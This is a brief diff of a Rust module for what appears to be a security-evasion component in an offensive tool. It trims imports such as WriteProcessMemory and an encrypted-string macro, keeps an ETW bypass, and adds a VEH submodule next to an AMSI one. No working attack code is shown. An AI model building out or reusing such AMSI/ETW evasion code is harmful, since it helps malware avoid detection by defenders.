@@ -1,19 +1,8 @@
-use std::ffi::c_void;
-
-use shared_no_std::export_resolver;
-use shared_no_std::export_resolver::ExportResolveError;
-use str_crypter::{decrypt_string, sc};
-use windows_sys::Win32::System::{
-    Diagnostics::Debug::WriteProcessMemory, Threading::GetCurrentProcess,
-};
-
-use crate::{
-    evasion::etw::etw_bypass,
-    utils::console::{print_failed, print_info},
-};
+use crate::evasion::etw::etw_bypass;
 
 pub mod amsi;
 mod etw;
+mod veh;
 
 pub fn run_evasion() {
     //
